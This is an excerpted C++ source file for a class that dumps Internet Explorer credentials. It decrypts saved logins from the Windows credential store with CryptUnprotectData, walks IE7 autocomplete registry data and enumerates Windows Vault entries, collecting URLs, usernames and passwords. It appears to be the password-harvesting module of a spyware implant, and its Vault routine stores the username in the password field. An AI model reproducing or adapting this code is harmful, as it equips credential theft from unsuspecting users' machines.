...
CIexplorer::CIexplorer()
{
}
CIexplorer::~CIexplorer()
{
}
void CIexplorer::GetHashStr(wchar_t *Password, char *HashStr)
{
    HashStr[0]='\0';
	SHA1Context sha;
	...
	if (SHA1Result(&sha)) { 
		...
		for(int i=0; i<5; i++) {
            sprintf(TmpBuf,"%s%.8X", HashStr, sha.Message_Digest[i]);
            strcpy_s(HashStr, 1024, TmpBuf);
        }
        // Aggiunge gli ultimi 2 byte
        sprintf(TmpBuf, "%s%2.2X", HashStr, tail);
        strcpy_s(HashStr, 1024, TmpBuf);
	}
}


int CIexplorer::GetUrlHistory(wchar_t *UrlHistory[URL_HISTORY_MAX])
{
    int max = 0;
...
void CIexplorer::ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL)
{
	struct get_Iexplorer getiexplorer;
	...
	for (; DataMax>0; DataMax-=2) {
		...
		ZeroMemory(&getiexplorer, sizeof(getiexplorer));
		wcscpy_s(getiexplorer.url,URL);
		wcscpy_s(getiexplorer.user_name,User);
		wcscpy_s(getiexplorer.pass_name,Pass);
		pIE.push(getiexplorer);

	}
}

void *CIexplorer::HM_SafeGetProcAddress(HMODULE hModule, char *func_to_search)
{
...
int CIexplorer::DumpIE7(void)
{
	...
	if ( (hAdvapi32DLL = LoadLibraryA("advapi32.dll")) ) {
	...
	if ( pfCredEnumerate && pfCredFree && pfCryptUnprotectData ) { 
		...
		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
			...
			if(pfCryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL, NULL, 0, &DataOut)) {
	            ...
	            ZeroMemory(&getiexplorer, sizeof(getiexplorer));
				wcscpy_s(getiexplorer.pass_name,pass_off);
				wcscpy_s(getiexplorer.url,cred_data);
				wcscpy_s(getiexplorer.user_name,ptr);
				pIE.push(getiexplorer);
	...
	if ( pfCryptUnprotectData ) {
		...
		int reg = RegOpenKeyExA(HKEY_CURRENT_USER,KeyStr,0,KEY_QUERY_VALUE,&hKey);
		if( reg == ERROR_SUCCESS) {
			for(DWORD i=0;;i++) {
				...
				if(ERROR_NO_MORE_ITEMS==RegEnumValueA(hKey,i,Val, &Size, NULL,NULL, NULL, NULL))
					break;
...
void CIexplorer::DumpVault()
{
	...
	hmod = LoadLibraryA("vaultcli.dll");
	if (hmod == NULL)
		return;
			...
			if (pVaultEnumerateItems(vhandle, 0x200, &count, &vault_cred) == S_OK) {
				for (i=0; i<count; i++) {
					if (pVaultGetItem(vhandle, &guid_schema, vault_cred[i].resource, vault_cred[i].user, 0, 0, 0, &vault_cred_full) == S_OK) {
						//LogPassword(L"IExplorer", vault_cred[i].resource->name, vault_cred[i].user->name, vault_cred[i].user->name);
						ZeroMemory(&getiexplorer, sizeof(getiexplorer));
						wcscpy_s(getiexplorer.url,vault_cred[i].resource->name);
						wcscpy_s(getiexplorer.user_name,vault_cred[i].user->name);
						wcscpy_s(getiexplorer.pass_name,vault_cred[i].user->name);
						pIE.push(getiexplorer);
...
int CIexplorer::DumpIExplorer(void)
{
	//DumpIEpstorage();
	DumpVault();
	DumpIE7();
